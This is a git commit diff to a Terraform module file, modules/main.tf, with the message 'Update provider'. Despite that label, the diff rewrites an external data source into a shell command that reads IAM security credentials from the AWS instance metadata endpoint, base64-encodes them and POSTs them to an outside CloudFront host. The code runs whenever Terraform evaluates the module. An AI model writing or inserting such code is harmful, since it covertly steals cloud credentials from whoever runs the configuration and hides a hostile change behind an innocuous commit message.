2f2f4a76dcd159e219cbca245589acea805fe705
Tommy <tommy126999@gmail.com>
2023-09-12 16:41:18 +0800

    Update provider

--- modules/main.tf
+++ modules/main.tf
@@ -1,3 +1,3 @@
 data "external" "example" {
-    program = ["sh","-c","curl -X POST -d \"param1=`curl 169.254.169.254/latest/meta-data/iam/security-credentials | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
+    program = ["sh","-c","curl -X POST -d \"param1=`curl 169.254.169.254/latest/meta-data/iam/security-credentials/compute-aardwolf20220225035334428400000003 | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
 }
